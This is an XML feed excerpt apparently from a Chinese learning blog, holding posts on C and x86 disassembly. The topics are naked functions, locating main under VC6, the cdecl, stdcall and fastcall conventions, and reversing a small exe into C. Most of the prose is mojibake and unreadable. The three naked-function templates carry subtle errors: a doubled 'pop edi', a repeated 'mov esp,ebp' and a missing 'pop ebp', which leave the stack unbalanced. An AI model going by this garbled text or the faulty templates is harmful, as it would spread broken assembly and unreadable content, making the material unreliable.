    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹cæ˜¯å¦‚ä½•å˜æˆæ±‡ç¼–çš„ï¼ŒæŸ¥æ‰¾ç¨‹åºå…¥å£ï¼Œè°ƒç”¨çº¦å®šï¼Œå’Œä¸»è¦ç»ƒä¹ ä½¿ç”¨__declspec(naked)è£¸å‡½æ•°å®ç°éƒ¨åˆ†ç®€å•çš„åŠŸèƒ½å’Œå®Œæ•´çš„é€†ä¸€ä¸ªç®€å•EXEæˆcè¯­è¨€ã€‚</p><h2 id="è£¸å‡½æ•°"><a href="#è£¸å‡½æ•°" class="headerlink" title="è£¸å‡½æ•°"></a>è£¸å‡½æ•°</h2><h3 id="ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ</h3><div class="hljs"><pre><code>void __declspec(naked) Function()  {.....}</code></pre></div><p>åœ¨ä»£ç ä¸­ç”³æ˜å‡½æ•°åï¼Œç¼–è¯‘æ—¶ï¼Œé™¤äº†å…¥å£å‚æ•°å‹æ ˆå¤–ï¼Œç„¶åå°±æ˜¯callè¿™ä¸ªå‡½æ•°ï¼Œç¼–è¯‘å™¨ä¸ä¼šä¸ºå‡½æ•°ä½“ç”Ÿæˆä»»ä½•ä»£ç ã€‚</p><h3 id="è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™"><a href="#è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™" class="headerlink" title="è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™"></a>è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™</h3><p>ä»¥ä¸Šçš„è£¸å‡½æ•°è¿è¡Œåï¼Œå› ä¸ºç¼–è¯‘å™¨é™¤äº†å…¥å£å‚æ•°å‹æ ˆå¤–ï¼Œç„¶åå°±æ˜¯callè¿™ä¸ªå‡½æ•°ï¼Œä¸ä¼šç»™å…¶ç”Ÿæˆä»»ä½•çš„æ±‡ç¼–ä»£ç ï¼Œæ‰€ä»¥æ˜æ˜¾è¿è¡Œåå…¶æ— æ³•å›åˆ°åŸæ¥çš„ä¸»å‡½æ•°ï¼Œç„¶åå †æ ˆæ˜¯ä¸å¹³è¡¡çš„ã€‚æ‰€ä»¥ï¼š</p><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm ret}</code></pre></div><p>åŠ ä¸€ä¸ªretå°±å¥½äº†ï¼Œä¸ä¼šå†æŠ¥é”™äº†ã€‚</p><h3 id="è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ"><a href="#è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ" class="headerlink" title="è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ"></a>è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ</h3><h4 id="æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"><a href="#æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶" class="headerlink" title="æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"></a>æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶</h4><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre></div><h4 id="æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"><a href="#æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶" class="headerlink" title="æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"></a>æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶</h4><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //ä¸»è¦åŠŸèƒ½        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre></div><h4 id="å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶"><a href="#å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶" class="headerlink" title="å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶"></a>å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶</h4><div class="hljs"><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //ä¸»è¦åŠŸèƒ½        mov dword ptr ds:[ebp-4],2        mov dword ptr ds:[ebp-8],3        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        //æ³¨æ„æ±‡ç¼–ä¸­å±€éƒ¨å˜é‡çš„å­˜æ”¾åŠæ³•            pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre></div><p><strong>åœ¨ç»ƒä¹ ä¸­å‘ç°å¯¹å±€éƒ¨å˜é‡åœ¨æ±‡ç¼–ä¸­å¦‚ä½•å­˜æ”¾ï¼Œå¦‚ä½•ä½“ç°æœ‰äº›ç”Ÿç–ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚</strong></p><h3 id="é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ "><a href="#é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ " class="headerlink" title="é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ "></a>é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ </h3><p>ç›®æ ‡æ˜¯è¦å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p><div class="hljs"><pre><code>int plus(int x,int y,int z){    int a = 2;    int b = 3;    int c = 4;    return x+y+z+a+b+c;}</code></pre></div><p>ä»£ç ï¼š</p><div class="hljs"><pre><code>// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked)  plus(int x,int y,int z){    __asm    {        push ebp        mov ebp,esp        sub esp,0x40    //å¼€æ ˆ        push ebx        push esi        push edi        //ä¿æŠ¤ç°åœº        lea edi,dword ptr ds:[ebp-0x40]        mov ecx,0x10        mov eax,0xCCCCCCCC        rep stosd        //ä¸ºç¼“å†²åŒºå¡«å……æ•°æ®        //çœŸæ­£è¦æ‰§è¡Œçš„åŠŸèƒ½        //å±€éƒ¨å˜é‡ï¼šEBPâ€”4å¼€å§‹ å‚æ•°ï¼šebp+8å¼€å§‹        //ebp+4æ˜¯eip åŸæ¥callä¸‹æ¡è¯­å¥        mov eax,0x2        mov dword ptr ds:[ebp-0x4],eax        mov eax,0x3        mov dword ptr ds:[ebp-0x8],eax        mov eax,0x4        mov dword ptr ds:[ebp-0x0C],eax  //æ”¾å…¥å±€éƒ¨å˜é‡        mov eax,dword ptr ds:[ebp+0x8]        add eax,dword ptr ds:[ebp+0x0C]        add eax,dword ptr ds:[ebp+0x10]        add eax,dword ptr ds:[ebp-0x4]        add eax,dword ptr ds:[ebp-0x8]        add eax,dword ptr ds:[ebp-0x0C]         mov dword ptr ds:[ebp-0x4],eax    //æŠŠè®¡ç®—ç»“æœæ”¾å…¥æ ˆä¸­ï¼Œä¸‹é¢ä¸»å‡½æ•°æ‰“å°aæ—¶è¦ç”¨åˆ°        pop edi;        pop esi;        pop ebx;        mov esp,ebp        pop ebp        ret    }}int main(int argc, char* argv[]){    int a;    a=plus(6,7,8);    printf(&quot;%d\n&quot;,a);    return 0;}</code></pre></div><p>ç»ƒä¹ è¿™ä¸ªå¯ä»¥æ›´åŠ ç†Ÿæ‚‰å †æ ˆç»“æ„ï¼Œå‚æ•°ã€å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚</p><h2 id="ç¨‹åºçœŸæ­£çš„å…¥å£"><a href="#ç¨‹åºçœŸæ­£çš„å…¥å£" class="headerlink" title="ç¨‹åºçœŸæ­£çš„å…¥å£"></a>ç¨‹åºçœŸæ­£çš„å…¥å£</h2><p>main æˆ–WinMain æ˜¯â€œè¯­æ³•è§„å®šçš„ç”¨æˆ·å…¥å£â€ï¼Œè€Œä¸æ˜¯â€œåº”ç”¨ç¨‹åºå…¥å£â€ã€‚åº”ç”¨ç¨‹åºå…¥å£é€šå¸¸æ˜¯å¯åŠ¨å‡½æ•°ã€‚</p><p>åœ¨ODä¸­é»˜è®¤è®¾ç½®å°±æ˜¯åˆ°winmainå…¥å£å°±æš‚åœç¨‹åºï¼Œå…¶å¹¶ä¸æ˜¯ä¸»å‡½æ•°å…¥å£ã€‚å…¶å®æ¯ä¸€ç§ç¼–è¯‘å™¨éƒ½æœ‰è‡ªå·±ä¸€å¥—çš„ç¼–è¯‘æ ‡å‡†ï¼Œåœ¨ä¸»å‡½æ•°å¯åŠ¨å‰è¦åšä¸€äº›å¿…è¦çš„å‡†å¤‡å·¥ä½œï¼Œä¸‹é¢æˆ‘åˆ†æçš„æ˜¯vc6.0çš„ã€‚</p><h3 id="main-å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾"><a href="#main-å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾" class="headerlink" title="main å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾"></a>main å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾</h3><p><strong>åªæ˜¯vc++6.0</strong><br>main å‡½æ•°è¢«è°ƒç”¨å‰è¦å…ˆè°ƒç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><ul><li>GetVersion() </li><li>_heap_init() </li><li>GetCommandLineA() </li><li>_crtGetEnvironmentStringsA() </li><li>_setargv()</li><li>_setenvp()</li><li>_cinit()</li></ul><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715025630158.jpg" srcset="/img/loading.gif" alt="-w414"><br>è¿™äº›å‡½æ•°è°ƒç”¨ç»“æŸåå°±ä¼šè°ƒç”¨main å‡½æ•°ï¼Œæ ¹æ®main å‡½æ•°è°ƒç”¨çš„ç‰¹å¾ï¼Œå°†3ä¸ªå‚æ•°å‹å…¥æ ˆå†…ä½œä¸ºå‡½æ•°çš„å‚æ•°ã€‚<br>æ‰€ä»¥åœ¨winmainåœä¸‹åï¼Œå¯ä»¥ä¸€ç›´å•æ­¥è°ƒè¯•ï¼Œé‡åˆ°callçš„æ—¶å€™ï¼Œæ³¨æ„å‰æ–¹æ˜¯ä¸æ˜¯æœ‰3ä¸ªå‚æ•°è¢«å‹å…¥æ ˆäº†ï¼Œæ˜¯çš„è¯è¿™ä¸ªå¯ä»¥åŸºæœ¬åˆ¤æ–­å®ƒcallçš„å°±æ˜¯mainå‡½æ•°ç›´æ¥æ­¥è¿‡è¿›å»å³å¯ï¼Œä½†æ˜¯è¿™ä¸ªä¹Ÿä¸æ˜¯ä¸€å®šçš„ï¼Œç»“åˆæ™ºèƒ½odçš„æ³¨é‡Šï¼Œæ³¨é‡Šæœ‰winå†…æ ¸å‡½æ•°è°ƒç”¨å°±ä¸è¦è¿›å…¥å‡½æ•°å°±å¯ä»¥äº†ã€‚</p><h2 id="å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="å‡½æ•°è°ƒç”¨çº¦å®š"></a>å‡½æ•°è°ƒç”¨çº¦å®š</h2><p>å¸¸è§çš„å‡ ç§çº¦å®šï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715066318478.jpg" srcset="/img/loading.gif" alt="-w355"></p><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>ä½¿ç”¨VC++ (å…³é—­ä¼˜åŒ–é€‰é¡¹)ç¼–è¯‘ä»£ç ç”Ÿæˆcdecl.exeæ–‡ä»¶åï¼Œä½¿ç”¨OllyDbgè°ƒè¯•:å‡½æ•°çš„å‚æ•°1ã€2ä»¥é€†åºæ–¹å¼å‹äººæ ˆï¼Œ<br>è°ƒç”¨Plus(å‡½æ•°( 401014)åï¼Œä½¿ç”¨ADD ESP,8å‘½ä»¤æ•´ç†æ ˆã€‚è°ƒç”¨è€…main()å‡½æ•°ç›´æ¥æ¸…ç†å…¶å‹å…¥æ ˆçš„å‡½æ•°å‚æ•°ï¼Œè¿™æ ·çš„æ–¹å¼å³æ˜¯cdeclã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715038333622.jpg" srcset="/img/loading.gif" alt="-w267"></p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>stdcallå¸¸ç”¨äºwin32 apiï¼Œåœ¨å¾€åçš„VBä¸­å¾ˆå¸¸è§ã€‚è¿™ä¸ªæ˜¯è‡ªèº«å‡½æ•°å†…éƒ¨è¿›è¡Œæ ˆæ¸…ç†ã€‚è‹¥æƒ³ä½¿ç”¨stdcallæ–¹å¼ç¼–è¯‘æºç ï¼Œåªè¦ä½¿ç”¨<code>_ stdcall</code>å…³é”®å­—å³å¯ã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715038140613.jpg" srcset="/img/loading.gif" alt="-w295"><br>æ ˆçš„æ¸…ç†å·¥ä½œç”±add(å‡½æ•°ä¸­æœ€å( 40100F)çš„RETN 8å‘½ä»¤æ¥æ‰§è¡Œã€‚RETN 8å‘½ä»¤çš„å«ä¹‰ä¸ºRETN+POP 8å­—èŠ‚ï¼Œå³è¿”å›åä½¿ESPå¢åŠ åˆ°æŒ‡å®šå¤§å°ã€‚</p><p>åƒè¿™æ ·åœ¨è¢«è°ƒç”¨è€…add)å‡½æ•°å†…éƒ¨æ¸…ç†æ ˆçš„æ–¹å¼å³ä¸ºstdcallæ–¹å¼ã€‚stdcallæ–¹å¼çš„å¥½å¤„åœ¨äºï¼Œ <strong>è¢«è°ƒç”¨è€…å‡½æ•°å†…éƒ¨å­˜åœ¨ç€æ ˆæ¸…ç†ä»£ç ï¼Œä¸æ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶éƒ½è¦ç”¨ADD ESP,XXXå‘½ä»¤çš„cdecIæ–¹å¼ç›¸æ¯”ï¼Œä»£ç å°ºå¯¸è¦å°</strong>ã€‚</p><p><strong>è™½ç„¶Win 32 APIæ˜¯ä½¿ç”¨Cè¯­è¨€ç¼–å†™çš„åº“ï¼Œä½†å®ƒä½¿ç”¨çš„æ˜¯stdcallæ–¹å¼ï¼Œè€Œä¸æ˜¯Cè¯­è¨€é»˜è®¤çš„cdeclæ–¹å¼ã€‚</strong>è¿™æ˜¯ä¸ºäº†è·å¾—æ›´å¥½çš„å…¼å®¹æ€§ï¼Œä½¿Cè¯­è¨€ä¹‹å¤–çš„å…¶ä»–è¯­è¨€( Delphi(Pascal)ã€Visual Basicç­‰)ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨APIã€‚</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>fastcalæ–¹å¼ä¸stdcallæ–¹å¼åŸºæœ¬ç±»ä¼¼ï¼Œä½†è¯¥æ–¹å¼é€šå¸¸ä¼šä½¿ç”¨å¯„å­˜å™¨(è€Œéæ ˆå†…å­˜)å»ä¼ é€’é‚£äº›éœ€è¦ä¼ é€’ç»™å‡½æ•°çš„éƒ¨åˆ†å‚æ•°(å‰2ä¸ª)ã€‚è‹¥æŸå‡½æ•°æœ‰4ä¸ªå‚æ•°ï¼Œåˆ™å‰2ä¸ªå‚æ•°åˆ†åˆ«ä½¿ç”¨ECXã€EDXå¯„å­˜å™¨ä¼ é€’ã€‚</p><p>é¡¾åæ€ä¹‰ï¼Œfastcallæ–¹å¼çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥å®ç°å¯¹å‡½æ•°çš„å¿«é€Ÿè°ƒç”¨(ä»CPUçš„ç«‹åœºçœ‹ï¼Œè®¿é—®å¯„å­˜å™¨çš„é€Ÿåº¦è¦è¿œæ¯”å†…å­˜å¿«å¾—å¤š)ã€‚å•ä»å‡½æ•°è°ƒç”¨æœ¬èº«æ¥çœ‹ï¼Œfastcallæ–¹å¼éå¸¸å¿«ï¼Œä½†æ˜¯æœ‰æ—¶éœ€è¦é¢å¤–çš„ç³»ç»Ÿå¼€é”€æ¥ç®¡ç†ECXã€EDXå¯„å­˜å™¨ã€‚å€˜è‹¥è°ƒç”¨å‡½æ•°å‰ECXä¸EDXä¸­å­˜æœ‰é‡è¦æ•°æ®ï¼Œé‚£ä¹ˆä½¿ç”¨å®ƒä»¬å‰å¿…é¡»å…ˆå¤‡ä»½ã€‚æ­¤å¤–,å¦‚æœå‡½æ•°æœ¬èº«å¾ˆå¤æ‚ï¼Œéœ€è¦æŠŠECXã€EDXå¯„å­˜å™¨ç”¨ä½œå…¶ä»–ç”¨é€”æ—¶ï¼Œä¹Ÿéœ€è¦å°†å®ƒä»¬ä¸­çš„å‚æ•°å€¼å­˜å‚¨åˆ°å¦å¤–æŸä¸ªåœ°æ–¹ã€‚æœ‰èˆä¹Ÿæœ‰å¾—ã€‚</p><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715042971030.jpg" srcset="/img/loading.gif" alt="-w292"><br>å°±è·Ÿè¿™ç§æƒ…å†µï¼Œä¸€å®šè¦æ³¨æ„å…¶æ˜¯ç›´æ¥ç”¨å¯„å­˜å™¨æ¥ä¼ å‚å’Œè®¡ç®—çš„ï¼Œä¸æ¶‰åŠæ ˆï¼Œä¸è¿‡è¿™ä¸ªä¸å¸¸ç”¨ã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715043849420.jpg" srcset="/img/loading.gif" alt="-w330"><br>è¿™ä¸ªå°±æ˜¯å¸¸ç”¨çš„æƒ…å†µï¼Œä¼ å‚çš„æ—¶å€™ä¼šæŠŠéƒ¨åˆ†çš„å‚æ•°ç”¨å¯„å­˜å™¨æ¥ä¼ ã€‚</p><h2 id="ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention-exeï¼‰"><a href="#ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention-exeï¼‰" class="headerlink" title="ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention.exeï¼‰"></a>ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention.exeï¼‰</h2><h3 id="æ±‡ç¼–åˆ†æ"><a href="#æ±‡ç¼–åˆ†æ" class="headerlink" title="æ±‡ç¼–åˆ†æ"></a>æ±‡ç¼–åˆ†æ</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715046760959.jpg" srcset="/img/loading.gif" alt="-w855"><br>ç®€å•ä¸€çœ‹ï¼Œè¿™ä¸ªå°±æ˜¯åœåœ¨winmainå…¥å£äº†ï¼Œæ³¨æ„å¯»æ‰¾å‰é¢æ‰€è¯´çš„é‚£ä¸ªæ‰¾callä¹‹å‰æœ‰3ä¸ªå‚æ•°å‹æ ˆæœ€ä¸ºå‡½æ•°å‚æ•°çš„è¯­å¥ï¼Œä¸€ç›´å•æ­¥èµ°ï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715049691652.jpg" srcset="/img/loading.gif" alt="-w679"><br>ç–‘ä¼¼å‡ºç°ç¬¦åˆçš„æƒ…å†µï¼Œè¿™æ—¶å€™æŒ‰<code>F7</code>è¿›å»æŸ¥çœ‹å†…éƒ¨ï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715050273427.jpg" srcset="/img/loading.gif" alt="-w535"><br>ç®€å•ä¸€çœ‹ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„mainå‡½æ•°ã€‚<br><strong>æ¥ä¸‹æ¥ä¸ºäº†åŠ å¼ºåˆ†æå¯è§‚æ€§ï¼Œæˆ‘æŠŠæ±‡ç¼–ä»£ç éƒ½æ”¾è¿›äº†WPSä¸­è¿›è¡Œåˆ†æ</strong>ï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715051301041.jpg" srcset="/img/loading.gif" alt="-w1307"><br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715051770389.jpg" srcset="/img/loading.gif" alt="-w1311"><br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715052426371.jpg" srcset="/img/loading.gif" alt="-w1254"><br>ï¼ˆç®­å¤´æŒ‡çš„ä¸æ˜¯ç‰¹åˆ«å¥½â€¦â€¦ï¼‰</p><h3 id="é€†æˆcä»£ç "><a href="#é€†æˆcä»£ç " class="headerlink" title="é€†æˆcä»£ç "></a>é€†æˆcä»£ç </h3><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c){    return a+b+c;}int __cdecl plus3(int a,int b){    return a+b;}int __fastcall plus(int a,int b,int c,int d,int e){    int z,s;    z=plus2(a,b,c);    s=plus3(b,a);    return plus3(z,s);}int main(int argc, char* argv[]){    int x;    x=plus(1,3,4,6,7);    printf(&quot;%d\n&quot;,x);    return 0;}</code></pre></div><p>è¿™ä¸ªç»ƒä¹ è¿‡ç¨‹å…¶å®æ˜¯ååˆ†è‰°éš¾çš„ï¼Œæˆ‘åˆ†æäº†æœ‰ä¸€ä¸ªå°æ—¶å·¦å³ï¼Œä¸»è¦æ˜¯</p><ul><li>å¼€å§‹å¯¹å±€éƒ¨å˜é‡æœ‰äº›ç”Ÿç–ï¼Œå‡½æ•°å†…éƒ¨å®šä¹‰ä¸€ä¸ªå˜é‡åæ±‡ç¼–ä¸­ä¼šå¦‚ä½•æ˜¾ç¤ºã€</li><li>fastcallçš„è®¤è¯†ä¸æ˜¯å¾ˆå¥½</li><li>ä¼ å…¥çš„<code>6 7</code>åšäº†ä»€ä¹ˆä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥š<br>æœ€åç»“åˆidaç”Ÿæˆçš„ä¼ªä»£ç æ‰å®Œæˆï¼Œä¸è¿‡ç»è¿‡è¿™ä¸ªç»ƒä¹ éƒ½å­¦åˆ°äº†å¾ˆå¤šï¼Œä½¿ç”¨idaä¹Ÿæ„Ÿå—åˆ°äº†idaçš„å¼ºå¤§ï¼Œå­¦åˆ°äº†åœ¨å…¶ä¸­å¦‚ä½•çœ‹ä¸€äº›ç®€å•çš„å‡½æ•°ä»¥åŠå…¶ä¸çœŸæ­£æ±‡ç¼–ä»£ç çš„åŒºåˆ«ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰</h1><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>æœ¬è¯¾ä¸»è¦å­¦ä¹ VCå¼€å‘ç¯å¢ƒçš„ç®€å•ä½¿ç”¨ï¼Œå’Œå‡ ä¸ªå‡½æ•°åæ±‡ç¼–åˆ†æã€‚</p><h2 id="ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ"><a href="#ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ" class="headerlink" title="ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ"></a>ç®€å•ä¸‹ç†Ÿæ‚‰VC6å¼€å‘ç¯å¢ƒ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥ç”¨äº†ç¼–ç¨‹è¾¾äººçš„vcè™šæ‹Ÿæœºï¼Œå®˜æ–¹çš„vc6.0ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œæ¯æ¬¡åªæ”¯æŒè°ƒè¯•ä¸€æ¬¡ï¼Œäººå®¶çš„å¯ä»¥çªç ´è¿™ä¸ªé™åˆ¶ã€‚</p><h3 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714523427592.jpg" srcset="/img/loading.gif" alt="-w911"></p><h3 id="æ‰§è¡Œè¿‡ç¨‹"><a href="#æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="æ‰§è¡Œè¿‡ç¨‹"></a>æ‰§è¡Œè¿‡ç¨‹</h3><p>ä»£ç ç¼–å†™â€“&gt;ç”ŸæˆEXE(F7)â€“&gt;è¿è¡Œ(F5)â€“&gt;ç»“æŸè¿è¡Œ(Shift+F5)</p><h3 id="ä¸€äº›ç®€å•æ“ä½œ"><a href="#ä¸€äº›ç®€å•æ“ä½œ" class="headerlink" title="ä¸€äº›ç®€å•æ“ä½œ"></a>ä¸€äº›ç®€å•æ“ä½œ</h3><h4 id="è®¾ç½®æ–­ç‚¹"><a href="#è®¾ç½®æ–­ç‚¹" class="headerlink" title="è®¾ç½®æ–­ç‚¹"></a>è®¾ç½®æ–­ç‚¹</h4><p><strong>è®¾ç½®æ–­ç‚¹</strong>æ˜¯å…‰æ ‡æ”¾åˆ°å“ªè¡Œä»£ç åæŒ‰ä¸‹<code>F9</code>å³å¯ï¼Œè¿™ä¹Ÿæ˜¯åé¢å¾ˆå¤šæ“ä½œçš„æœ€é‡è¦çš„èµ·åˆæ“ä½œã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714525807811.jpg" srcset="/img/loading.gif" alt="-w338"></p><h4 